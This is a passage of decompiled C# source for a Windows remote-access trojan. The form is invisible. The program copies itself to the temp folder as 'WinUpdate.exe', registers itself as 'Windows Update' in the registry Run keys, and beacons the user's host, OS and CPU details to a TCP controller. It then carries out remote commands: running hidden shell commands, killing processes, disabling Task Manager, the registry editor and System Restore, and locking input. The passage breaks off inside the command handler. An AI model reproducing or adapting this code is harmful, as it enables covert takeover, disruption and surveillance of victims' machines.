using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using SQLiteWrapper;
using ns0;

[DesignerGenerated]
public sealed class Form1 : Form
{
	private enum Enum1
	{
		const_0 = 0,
		const_1 = 1,
		const_2 = 2,
		const_3 = 3,
		const_4 = 4,
		const_5 = 5,
		const_6 = 6,
		const_7 = 7,
		const_8 = 8,
		const_9 = 9,
		const_10 = 10,
		const_11 = 11,
		const_12 = 11
	}

	private enum Enum2 : uint
	{
		const_0,
		const_1,
		const_2,
		const_3,
		const_4,
		const_5,
		const_6
	}

	private enum Enum3 : uint
	{
		const_0 = 1u,
		const_1 = 2u,
		const_2 = 4u
	}

	public sealed class NativeMethods
	{
		public const int ENUM_CURRENT_SETTINGS = -1;

		public const int DISP_CHANGE_SUCCESSFUL = 0;

		public const int DISP_CHANGE_BADDUALVIEW = -6;

		public const int DISP_CHANGE_BADFLAGS = -4;

		public const int DISP_CHANGE_BADMODE = -2;

		public const int DISP_CHANGE_BADPARAM = -5;

		public const int DISP_CHANGE_FAILED = -1;

		public const int DISP_CHANGE_NOTUPDATED = -3;

		public const int DISP_CHANGE_RESTART = 1;

		public const int DMDO_DEFAULT = 0;

		public const int DMDO_90 = 1;

		public const int DMDO_180 = 2;

		public const int DMDO_270 = 3;

		[DllImport("user32.dll", CharSet = CharSet.Ansi)]
		public static extern int EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);

		[DllImport("user32.dll", CharSet = CharSet.Ansi)]
		public static extern int ChangeDisplaySettings(ref DEVMODE lpDevMode, int dwFlags);

		public static DEVMODE CreateDevmode()
		{
			DEVMODE dEVMODE = default(DEVMODE);
			dEVMODE.dmDeviceName = new string(new char[32]);
			dEVMODE.dmFormName = new string(new char[32]);
			dEVMODE.dmSize = checked((short)Conversion.Fix(Marshal.SizeOf((object)dEVMODE)));
			return dEVMODE;
		}
	}

	public struct DEVMODE
	{
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string dmDeviceName;

		public short dmSpecVersion;

		public short dmDriverVersion;

		public short dmSize;

		public short dmDriverExtra;

		public int dmFields;

		public int dmPositionX;

		public int dmPositionY;

		public int dmDisplayOrientation;

		public int dmDisplayFixedOutput;

		public short dmColor;

		public short dmDuplex;

		public short dmYResolution;

		public short dmTTOption;

		public short dmCollate;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string dmFormName;

		public short dmLogPixels;

		public short dmBitsPerPel;

		public int dmPelsWidth;

		public int dmPelsHeight;

		public int dmDisplayFlags;

		public int dmDisplayFrequency;

		public int dmICMMethod;

		public int dmICMIntent;

		public int dmMediaType;

		public int dmDitherType;

		public int dmReserved1;

		public int dmReserved2;

		public int dmPanningWidth;

		public int dmPanningHeight;
	}

	private IContainer icontainer_0;

	[AccessedThroughProperty("realoder")]
	private Timer timer_0;

	[AccessedThroughProperty("draw")]
	private Timer timer_1;

	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker backgroundWorker_0;

	[AccessedThroughProperty("BackgroundWorker2")]
	private BackgroundWorker backgroundWorker_1;

	private Random random_0;

	private string string_0;

	private string string_1;

	private int int_0;

	private TcpClient tcpClient_0;

	private object object_0;

	private TcpClient tcpClient_1;

	private object object_1;

	private bool bool_0;

	private PictureBox pictureBox_0;

	private string string_2;

	private string string_3;

	private string string_4;

	private const int int_1 = 20;

	private const int int_2 = 1;

	public const long MB_DEFBUTTON1 = 0L;

	public const long MB_DEFBUTTON2 = 256L;

	private const int int_3 = 61808;

	private const int int_4 = 128;

	private const int int_5 = 64;

	private int int_6;

	private const int int_7 = 524288;

	private const int int_8 = 793;

	private long long_0;

	private long long_1;

	private long long_2;

	private long long_3;

	private long long_4;

	private string string_5;

	private const int int_9 = 12;

	private const int int_10 = 13;

	private const int int_11 = 2;

	private const int int_12 = 91;

	private bool bool_1;

	private const int int_13 = 61760;

	private const int int_14 = 274;

	private object object_2;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		random_0 = new Random();
		string_0 = Conversions.ToString(random_0.Next(10000, 99999));
		string_1 = "127.0.0.1";
		int_0 = 7008;
		object_0 = "<-1337->";
		object_1 = "";
		bool_0 = false;
		string_2 = "";
		string_3 = "";
		string_4 = "";
		bool_1 = false;
		object_2 = "";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new Timer(icontainer_0));
		vmethod_5(new BackgroundWorker());
		vmethod_7(new BackgroundWorker());
		((Control)this).SuspendLayout();
		vmethod_0().set_Interval(1000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(53, 25);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(Timer timer_2)
	{
		EventHandler eventHandler = method_6;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_2;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_2()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Timer timer_2)
	{
		EventHandler eventHandler = method_8;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_2;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual BackgroundWorker vmethod_4()
	{
		return backgroundWorker_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(BackgroundWorker backgroundWorker_2)
	{
		DoWorkEventHandler value = method_9;
		if (backgroundWorker_0 != null)
		{
			backgroundWorker_0.DoWork -= value;
		}
		backgroundWorker_0 = backgroundWorker_2;
		if (backgroundWorker_0 != null)
		{
			backgroundWorker_0.DoWork += value;
		}
	}

	[SpecialName]
	internal virtual BackgroundWorker vmethod_6()
	{
		return backgroundWorker_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(BackgroundWorker backgroundWorker_2)
	{
		DoWorkEventHandler value = method_10;
		if (backgroundWorker_1 != null)
		{
			backgroundWorker_1.DoWork -= value;
		}
		backgroundWorker_1 = backgroundWorker_2;
		if (backgroundWorker_1 != null)
		{
			backgroundWorker_1.DoWork += value;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public object LoadSet()
	{
		object_1 = Strings.Split(File.ReadAllText(Application.get_ExecutablePath()), "@why1@", -1, (CompareMethod)0);
		Mutex mutex = new Mutex(initiallyOwned: false, Conversions.ToString(NewLateBinding.LateIndexGet(object_1, new object[1] { 4 }, (string[])null)));
		if (!mutex.WaitOne(0, exitContext: false))
		{
			ProjectData.EndApp();
		}
		string_1 = Conversions.ToString(NewLateBinding.LateIndexGet(object_1, new object[1] { 1 }, (string[])null));
		int_0 = Conversions.ToInteger(NewLateBinding.LateIndexGet(object_1, new object[1] { 2 }, (string[])null));
		object result = default(object);
		try
		{
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(object_1, new object[1] { 3 }, (string[])null), (object)true, false))
			{
				try
				{
					if (!File.Exists(Path.GetTempPath() + "WinUpdate.exe"))
					{
						File.Copy(Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + "WinUpdate.exe");
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					RegistryKey registryKey = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey.SetValue("Windows Update", Path.GetTempPath() + "WinUpdate.exe");
					registryKey.Close();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					RegistryKey registryKey2 = ((ServerComputer)Class1.Class0_0).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey2.SetValue("Windows Update", Path.GetTempPath() + "WinUpdate.exe");
					registryKey2.Close();
					return result;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void Connect()
	{
		try
		{
			LoadSet();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			IPHostEntry hostByName = Dns.GetHostByName(Dns.GetHostName());
			string text = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "E_NotFound"));
			object obj = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string_0 + "|", hostByName.AddressList.GetValue(0)!.ToString()), "|"), ""), "|"), text), "|"), Environment.UserName), "|"), RegionInfo.CurrentRegion.DisplayName), "|"), ((ServerComputer)Class1.Class0_0).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "ProcessorNameString", (object)null)), (object)"|"), ((ServerComputer)Class1.Class0_0).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "~MHz", (object)null)), (object)" MB"), (object)"|Idle...");
			tcpClient_0 = new TcpClient(string_1, int_0);
			Send(Conversions.ToString(Operators.ConcatenateObject((object)"CONNECTED|", obj)));
			tcpClient_0.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, Read, null);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			Thread.Sleep(4000);
			Connect();
			ProjectData.ClearProjectError();
		}
	}

	public void Read(IAsyncResult ar)
	{
		try
		{
			StreamReader streamReader = new StreamReader(tcpClient_0.GetStream());
			string message = streamReader.ReadLine();
			Parse(message);
			tcpClient_0.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, Read, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Thread.Sleep(4000);
			Connect();
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void Parse(string Message)
	{
		//IL_121b: Unknown result type (might be due to invalid IL or missing references)
		//IL_123d: Unknown result type (might be due to invalid IL or missing references)
		//IL_125f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1281: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				string text = poly.Decrypt(Message);
				string[] array = text.Split(new char[1] { '|' });
				switch (array[0])
				{
				case "SHUTDOWN":
					try
					{
						SendStatus("Shutting down PC...");
						Interaction.Shell("shutdown -s", (AppWinStyle)2, false, -1);
						break;
					}
					catch (Exception projectError81)
					{
						ProjectData.SetProjectError(projectError81);
						SendStatus("Couldn't shutdown PC...");
						ProjectData.ClearProjectError();
						break;
					}
				case "REBOOT":
					try
					{
						SendStatus("Restarting...");
						Interaction.Shell("shutdown -r", (AppWinStyle)2, false, -1);
						break;
					}
					catch (Exception projectError89)
					{
						ProjectData.SetProjectError(projectError89);
						SendStatus("Couldn't restart PC...");
						ProjectData.ClearProjectError();
						break;
					}
				case "HIBERNATION":
					try
					{
						SendStatus("Going to hibernation...");
						Interaction.Shell("shutdown -h", (AppWinStyle)2, false, -1);
						break;
					}
					catch (Exception projectError88)
					{
						ProjectData.SetProjectError(projectError88);
						SendStatus("Couldn't perform hibernation...");
						ProjectData.ClearProjectError();
						break;
					}
				case "STANDBY":
					try
					{
						SendStatus("Going to standby...");
						Interaction.Shell("shutdown -l", (AppWinStyle)2, false, -1);
						break;
					}
					catch (Exception projectError87)
					{
						ProjectData.SetProjectError(projectError87);
						SendStatus("Couldn't perform standby...");
						ProjectData.ClearProjectError();
						break;
					}
				case "DIE":
					try
					{
						SendStatus("Bye...");
						ProjectData.EndApp();
						break;
					}
					catch (Exception projectError86)
					{
						ProjectData.SetProjectError(projectError86);
						SendStatus("Couldn't close myself...");
						ProjectData.ClearProjectError();
						break;
					}
				case "WALL":
					try
					{
						SendStatus("Changing wallpaper...");
						ChangeWallpaper(array[1]);
						SendStatus("Wallpaper changed...");
						break;
					}
					catch (Exception projectError85)
					{
						ProjectData.SetProjectError(projectError85);
						SendStatus("Couldn't change wallpaper...");
						ProjectData.ClearProjectError();
						break;
					}
				case "MUTESOUND":
					try
					{
						SendStatus("Muting sound...");
						MuteSound();
						SendStatus("Sound is muted...");
						break;
					}
					catch (Exception projectError84)
					{
						ProjectData.SetProjectError(projectError84);
						SendStatus("Couldn't mute sound...");
						ProjectData.ClearProjectError();
						break;
					}
				case "USBWRITE1":
					try
					{
						SendStatus("Enabling USB write...");
						((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", "WriteProtect", (object)"00000000", RegistryValueKind.DWord);
						SendStatus("USB write enabled...");
						break;
					}
					catch (Exception projectError83)
					{
						ProjectData.SetProjectError(projectError83);
						SendStatus("Couldn't enable usb write...");
						ProjectData.ClearProjectError();
						break;
					}
				case "USBWRITE2":
					try
					{
						SendStatus("Disabling USB write...");
						((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", "WriteProtect", (object)"00000001", RegistryValueKind.DWord);
						SendStatus("USB write disabled...");
						break;
					}
					catch (Exception projectError82)
					{
						ProjectData.SetProjectError(projectError82);
						SendStatus("Couldn't disable usb write...");
						ProjectData.ClearProjectError();
						break;
					}
				case "BSOD":
				{
					SendStatus("BSDO executed...");
					Process[] processes2 = Process.GetProcesses();
					foreach (Process process5 in processes2)
					{
						try
						{
							if (Operators.CompareString(process5.ProcessName, Application.get_ExecutablePath().Split(new char[1] { '\\' })[Application.get_ExecutablePath().Split(new char[1] { '\\' }).Length - 1].Split(new char[1] { '.' })[0], false) != 0)
							{
								process5.Kill();
							}
						}
						catch (Exception projectError80)
						{
							ProjectData.SetProjectError(projectError80);
							ProjectData.ClearProjectError();
						}
					}
					break;
				}
				case "LOCKCLIP1":
					try
					{
						SendStatus("Unlocking clipboard...");
						vmethod_0().Stop();
						SendStatus("Clipboard unlocked...");
						break;
					}
					catch (Exception projectError79)
					{
						ProjectData.SetProjectError(projectError79);
						SendStatus("Couldn't unlock clipboard...");
						ProjectData.ClearProjectError();
						break;
					}
				case "LOCKCLIP2":
					try
					{
						SendStatus("Locking clipboard...");
						vmethod_0().Start();
						SendStatus("Clipboard locked...");
						break;
					}
					catch (Exception projectError78)
					{
						ProjectData.SetProjectError(projectError78);
						SendStatus("Couldn't lock clipboard...");
						ProjectData.ClearProjectError();
						break;
					}
				case "MOUSE1":
					try
					{
						SendStatus("Swapping mouse...");
						changemouse(b: true);
						SendStatus("Mouse swapped...");
						break;
					}
					catch (Exception projectError77)
					{
						ProjectData.SetProjectError(projectError77);
						SendStatus("Couldn't swap mouse...");
						ProjectData.ClearProjectError();
						break;
					}
				case "MOUSE2":
					try
					{
						SendStatus("Swapping mouse...");
						changemouse(b: false);
						SendStatus("Mouse swapped...");
						break;
					}
					catch (Exception projectError76)
					{
						ProjectData.SetProjectError(projectError76);
						SendStatus("Couldn't sawp mouse...");
						ProjectData.ClearProjectError();
						break;
					}
				case "SAYTEXT":
					try
					{
						SendStatus("Enabling SAPI.Voice...");
						object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("sapi.spvoice", ""));
						object[] array14 = new object[1];
						string[] array15 = array;
						string[] array16 = array15;
						int num8 = 1;
						array14[0] = array16[1];
						object[] array17 = array14;
						bool[] array18 = new bool[1] { true };
						NewLateBinding.LateCall(objectValue, (Type)null, "Speak", array17, (string[])null, (Type[])null, array18, true);
						if (array18[0])
						{
							array15[num8] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array17[0]), typeof(string));
						}
						SendStatus("Command executed...");
						break;
					}
					catch (Exception projectError75)
					{
						ProjectData.SetProjectError(projectError75);
						SendStatus("Couldn't say text...");
						ProjectData.ClearProjectError();
						break;
					}
				case "SCREENSAVER1":
					try
					{
						SendStatus("Starting screensaver...");
						StartScreenSaver(start: false);
						SendStatus("Screensaver started...");
						break;
					}
					catch (Exception projectError74)
					{
						ProjectData.SetProjectError(projectError74);
						SendStatus("Couldn't start screensaver...");
						ProjectData.ClearProjectError();
						break;
					}
				case "SCREENSAVER2":
					try
					{
						SendStatus("Disabling screensaver...");
						StartScreenSaver(start: true);
						SendStatus("Screensaver disabled...");
						break;
					}
					catch (Exception projectError73)
					{
						ProjectData.SetProjectError(projectError73);
						SendStatus("Couldn't turn off screensaver...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CDROM1":
					try
					{
						SendStatus("Opening CD-ROM door...");
						string string_2 = "Set CDAudio Door Open Wait";
						string string_ = Conversions.ToString(0L);
						mciSendStringA(ref string_2, ref string_, 0L, 0L);
						SendStatus("CD-ROM door opened...");
						break;
					}
					catch (Exception projectError72)
					{
						ProjectData.SetProjectError(projectError72);
						SendStatus("Couldn't open cdrom door...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CDROM2":
					try
					{
						SendStatus("Closing CD-ROM door...");
						string string_ = "Set CDAudio Door Closed Wait";
						string string_2 = Conversions.ToString(0L);
						mciSendStringA(ref string_, ref string_2, 0L, 0L);
						SendStatus("CD-ROM door closed...");
						break;
					}
					catch (Exception projectError71)
					{
						ProjectData.SetProjectError(projectError71);
						SendStatus("Couldn't close cdrom door...");
						ProjectData.ClearProjectError();
						break;
					}
				case "DESKTOP1":
					try
					{
						SendStatus("Enabling desktop...");
						desktop(b: false);
						SendStatus("Desktop is enabled...");
						break;
					}
					catch (Exception projectError70)
					{
						ProjectData.SetProjectError(projectError70);
						SendStatus("Couldn't enable desktop...");
						ProjectData.ClearProjectError();
						break;
					}
				case "DESKTOP2":
					try
					{
						SendStatus("Disabling desktop...");
						desktop(b: true);
						SendStatus("Desktop is disabled...");
						break;
					}
					catch (Exception projectError69)
					{
						ProjectData.SetProjectError(projectError69);
						SendStatus("Couldn't disable desktop...");
						ProjectData.ClearProjectError();
						break;
					}
				case "DESKTOP3":
					try
					{
						SendStatus("Focusing desktop...");
						focusdesktop();
						SendStatus("Desktop is focused...");
						break;
					}
					catch (Exception projectError68)
					{
						ProjectData.SetProjectError(projectError68);
						SendStatus("Couldn't focus desktop...");
						ProjectData.ClearProjectError();
						break;
					}
				case "MONITOR1":
					try
					{
						SendStatus("Turning on monitor...");
						monitor(b: true);
						SendStatus("Monitor is on...");
						break;
					}
					catch (Exception projectError67)
					{
						ProjectData.SetProjectError(projectError67);
						SendStatus("Couldn't turn on monitor...");
						ProjectData.ClearProjectError();
						break;
					}
				case "MONITOR2":
					try
					{
						SendStatus("Turning monitor off...");
						monitor(b: false);
						SendStatus("Monitor is off...");
						break;
					}
					catch (Exception projectError66)
					{
						ProjectData.SetProjectError(projectError66);
						SendStatus("Couldn't turn off monitor...");
						ProjectData.ClearProjectError();
						break;
					}
				case "TASKBAR1":
					try
					{
						SendStatus("Enabling taskbar...");
						taskbarsh(b: true);
						SendStatus("Taskbar enabled...");
						break;
					}
					catch (Exception projectError65)
					{
						ProjectData.SetProjectError(projectError65);
						SendStatus("Couldn't enabled taskbar...");
						ProjectData.ClearProjectError();
						break;
					}
				case "TASKBAR2":
					try
					{
						SendStatus("Disabling taskbar...");
						taskbarsh(b: false);
						SendStatus("Taskbar disabled...");
						break;
					}
					catch (Exception projectError64)
					{
						ProjectData.SetProjectError(projectError64);
						SendStatus("Couldn't disable taskbar...");
						ProjectData.ClearProjectError();
						break;
					}
				case "ICONS1":
					try
					{
						SendStatus("Enabling icons...");
						icons(b: true);
						SendStatus("Icons enabled...");
						break;
					}
					catch (Exception projectError63)
					{
						ProjectData.SetProjectError(projectError63);
						SendStatus("Couldn't enabled icons...");
						ProjectData.ClearProjectError();
						break;
					}
				case "ICONS2":
					try
					{
						SendStatus("Disabling icons...");
						icons(b: false);
						SendStatus("Icons disabled...");
						break;
					}
					catch (Exception projectError62)
					{
						ProjectData.SetProjectError(projectError62);
						SendStatus("Couldn't disable icons...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CLOCK1":
					try
					{
						SendStatus("Enabling clock...");
						clock(b: true);
						SendStatus("Clock enabled...");
						break;
					}
					catch (Exception projectError61)
					{
						ProjectData.SetProjectError(projectError61);
						SendStatus("Couldn't enable clock...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CLOCK2":
					try
					{
						SendStatus("Disabling clock...");
						clock(b: false);
						SendStatus("Clock is disabled...");
						break;
					}
					catch (Exception projectError60)
					{
						ProjectData.SetProjectError(projectError60);
						SendStatus("Couldn't disable clock...");
						ProjectData.ClearProjectError();
						break;
					}
				case "INPUT1A":
					try
					{
						SendStatus("Enabling input...");
						keyboardmouse(b: true);
						SendStatus("Input enabled...");
						break;
					}
					catch (Exception projectError59)
					{
						ProjectData.SetProjectError(projectError59);
						SendStatus("Couldn't enable input...");
						ProjectData.ClearProjectError();
						break;
					}
				case "INPUT2A":
					try
					{
						SendStatus("Disabling input...");
						keyboardmouse(b: false);
						SendStatus("Input disabled...");
						break;
					}
					catch (Exception projectError58)
					{
						ProjectData.SetProjectError(projectError58);
						SendStatus("Couldn't disable input...");
						ProjectData.ClearProjectError();
						break;
					}
				case "NOTIFY1":
					try
					{
						SendStatus("Enabling Notify...");
						notify(b: true);
						SendStatus("Notify enabled...");
						break;
					}
					catch (Exception projectError57)
					{
						ProjectData.SetProjectError(projectError57);
						SendStatus("Couldn't enabled Notify...");
						ProjectData.ClearProjectError();
						break;
					}
				case "NOTIFY2":
					try
					{
						SendStatus("Disabling Notify...");
						notify(b: false);
						SendStatus("Notify disabled...");
						break;
					}
					catch (Exception projectError56)
					{
						ProjectData.SetProjectError(projectError56);
						SendStatus("Couldn't disable notify...");
						ProjectData.ClearProjectError();
						break;
					}
				case "DRAWME1":
					try
					{
						SendStatus("Enabling drawing...");
						int num7 = 0;
						do
						{
							dret.EnterText(array[1]);
							num7++;
						}
						while (num7 <= 10);
						SendStatus("Drawing enabled...");
						break;
					}
					catch (Exception projectError55)
					{
						ProjectData.SetProjectError(projectError55);
						SendStatus("Couldn't enable drawing...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CMD1":
					try
					{
						SendStatus("Enabling CMD...");
						cmd(b: true);
						SendStatus("CMD enabled...");
						break;
					}
					catch (Exception projectError54)
					{
						ProjectData.SetProjectError(projectError54);
						SendStatus("Couldn't enabled CMD...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CMD2":
					try
					{
						SendStatus("Disabling CMD...");
						cmd(b: false);
						SendStatus("CMD disabled...");
						break;
					}
					catch (Exception projectError53)
					{
						ProjectData.SetProjectError(projectError53);
						SendStatus("Couldn't disable CMD...");
						ProjectData.ClearProjectError();
						break;
					}
				case "REGISTRY1":
					try
					{
						SendStatus("Enabling Registry...");
						registry(b: true);
						SendStatus("Registry enabled...");
						break;
					}
					catch (Exception projectError52)
					{
						ProjectData.SetProjectError(projectError52);
						SendStatus("Couldn't enabled Registry...");
						ProjectData.ClearProjectError();
						break;
					}
				case "REGISTRY2":
					try
					{
						SendStatus("Disabling registry...");
						registry(b: false);
						SendStatus("Registry is disabled...");
						break;
					}
					catch (Exception projectError51)
					{
						ProjectData.SetProjectError(projectError51);
						SendStatus("Couldn't disable registry...");
						ProjectData.ClearProjectError();
						break;
					}
				case "RESTORE1":
					try
					{
						SendStatus("Enabling System Restore...");
						restore(b: true);
						SendStatus("System Restore enabled...");
						break;
					}
					catch (Exception projectError50)
					{
						ProjectData.SetProjectError(projectError50);
						SendStatus("Couldn't enable System Restore...");
						ProjectData.ClearProjectError();
						break;
					}
				case "RESTORE2":
					try
					{
						SendStatus("Disabling System Restore...");
						restore(b: false);
						SendStatus("System Restore disabled...");
						break;
					}
					catch (Exception projectError49)
					{
						ProjectData.SetProjectError(projectError49);
						SendStatus("Couldn't disable System Restore...");
						ProjectData.ClearProjectError();
						break;
					}
				case "TASKMGR1":
					try
					{
						SendStatus("Enabling Task Manager...");
						Taskmanager(b: true);
						SendStatus("Task Manager enabled...");
						break;
					}
					catch (Exception projectError48)
					{
						ProjectData.SetProjectError(projectError48);
						SendStatus("Couldn't enabled Task Manager...");
						ProjectData.ClearProjectError();
						break;
					}
				case "TASKMGR2":
					try
					{
						SendStatus("Disabling Task Manager...");
						Taskmanager(b: false);
						SendStatus("Task Manager disabled...");
						break;
					}
					catch (Exception projectError47)
					{
						ProjectData.SetProjectError(projectError47);
						SendStatus("Couldn't disable Task Manager...");
						ProjectData.ClearProjectError();
						break;
					}
				case "DELETESHIT":
					try
					{
						SendStatus("Cleaning recycly bin...");
						recycly.SHEmptyRecycleBin(IntPtr.Zero, null, recycly.RecycleFlags.SHRB_NOCONFIRMATION);
						SendStatus("Recycle bin cleaned...");
						break;
					}
					catch (Exception projectError46)
					{
						ProjectData.SetProjectError(projectError46);
						SendStatus("Couldn't clean recyclebin...");
						ProjectData.ClearProjectError();
						break;
					}
				case "PROCESSLIST":
					try
					{
						SendStatus("Getting process list...");
						string text23 = "";
						Process[] processes = Process.GetProcesses();
						foreach (Process process4 in processes)
						{
							text23 = text23 + process4.ProcessName + "--" + Conversions.ToString(process4.Id) + "--" + process4.MainWindowTitle + "<>";
						}
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|PROCESS", object_0), (object)text23)));
						SendStatus("Process list sent...");
						break;
					}
					catch (Exception projectError45)
					{
						ProjectData.SetProjectError(projectError45);
						SendStatus("Couldn't get process list...");
						ProjectData.ClearProjectError();
						break;
					}
				case "KILLPROCESS":
					try
					{
						SendStatus("Killing process...");
						Process[] processesByName3 = Process.GetProcessesByName(array[1]);
						foreach (Process process3 in processesByName3)
						{
							process3.Kill();
						}
						SendStatus("Process killed.");
						break;
					}
					catch (Exception projectError44)
					{
						ProjectData.SetProjectError(projectError44);
						SendStatus("Couldn't kill process.");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETPROCESSPATH":
					try
					{
						SendStatus("Getting process path...");
						Process[] processesByName2 = Process.GetProcessesByName(array[1]);
						foreach (Process process2 in processesByName2)
						{
							Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|PROCESSPATH", object_0), (object)process2.MainModule!.FileName)));
						}
						SendStatus("Sent process path...");
						break;
					}
					catch (Exception projectError43)
					{
						ProjectData.SetProjectError(projectError43);
						SendStatus("Couldn't get process path...");
						ProjectData.ClearProjectError();
						break;
					}
				case "STARTPROCESS":
					try
					{
						SendStatus("Opening file...");
						string[] array13 = Strings.Split(array[1], "<>", -1, (CompareMethod)0);
						if (Operators.CompareString(array13[1], "Focus", false) == 0)
						{
							Interaction.Shell(array[1], (AppWinStyle)1, false, -1);
						}
						if (Operators.CompareString(array13[1], "Hidden", false) == 0)
						{
							Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array13[1], "", false) == 0)
						{
							Interaction.Shell(array[1], (AppWinStyle)2, false, -1);
						}
						SendStatus("File opened...");
						break;
					}
					catch (Exception projectError42)
					{
						ProjectData.SetProjectError(projectError42);
						SendStatus("Couldn't open file...");
						ProjectData.ClearProjectError();
						break;
					}
				case "BEEPSOUND":
					try
					{
						SendStatus("Sending beep...");
						string[] array12 = Strings.Split(array[1], "<>", -1, (CompareMethod)0);
						Beep(Conversions.ToInteger(array12[0]), Conversions.ToInteger(array12[1]));
						SendStatus("Beep sent...");
						break;
					}
					catch (Exception projectError41)
					{
						ProjectData.SetProjectError(projectError41);
